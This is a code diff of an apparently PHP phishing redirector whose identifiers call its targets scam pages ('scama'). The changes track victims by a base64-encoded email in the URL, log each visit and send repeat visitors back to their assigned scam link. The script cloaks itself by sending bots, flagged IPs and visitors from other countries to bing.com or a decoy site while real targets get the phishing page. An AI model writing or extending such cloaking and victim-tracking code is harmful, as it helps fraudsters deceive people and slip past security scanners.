@@ -11,7 +11,24 @@ require_once('../core/beon_core.php');
 require_once('../core/short_core.php');
 
 
-@$email = $_GET['email'];
+@$email = base64_decode($_GET['key']);
+
+$origin = $_SERVER['HTTP_HOST'];
+
+$compare_scam = compare_scama($email);
+
+if ($compare_scam == true) {
+
+    $result_scama = result_scama($email);
+
+    $visit_scama = $result_scama[0]['link_scama'];
+    $id = $result_scama[0]['id_visitor_scama'];
+    insertVisitor($origin, $visit_scama, "NO", $email);
+    updateActivity($id);
+    header("Location: $visit_scama", TRUE, 301);
+    exit();
+}
+
 //ip from visitor
 $clint_code =  getCountry()['country_code'];
 // random link
@@ -20,28 +37,32 @@ $linkscama = $link[array_rand($link)]['link_sc'];
 // get country lock
 $country_lock = getCountryLock()[0]['country'];
 
-$origin = $_SERVER['HTTP_HOST'];
+
 
 if (deviceBot() === 'NO') {
     $chek_bot_ip = ipbot()['block'];
     $chek_bot_ip = strtoupper($chek_bot_ip);
     if ($chek_bot_ip === 'NO') {
         if ($country_lock === $clint_code) {
+            if (empty($email)) {
+                $email = generateRandomGmail();
+            }
+            Insert_scama($linkscama, $email);
             insertVisitor($origin, $linkscama, $chek_bot_ip, $email);
             header("Location: $linkscama", TRUE, 301);
             exit();
         } else {
-            insertVisitor($origin, $linkscama, 'YES', 'Diff country');
+            insertVisitor($origin, "https://theprofitstorm.com/", 'YES', 'Diff country');
             header("Location: https://theprofitstorm.com/", TRUE, 301);
             exit();
         }
     } else if ($chek_bot_ip === 'YES') {
-        insertVisitor($origin, $linkscama, 'YES', 'email kosong');
+        insertVisitor($origin, "https://bing.com/", 'YES', 'bot ip');
         header("Location: https://bing.com/", TRUE, 301);
         exit();
     }
 } else {
-    insertVisitor($origin, $linkscama, 'YES', 'email kosong');
+    insertVisitor($origin, "https://bing.com/", 'YES', 'Device bot');
     header("Location: https://bing.com/?=", TRUE, 301);
     exit();
 }
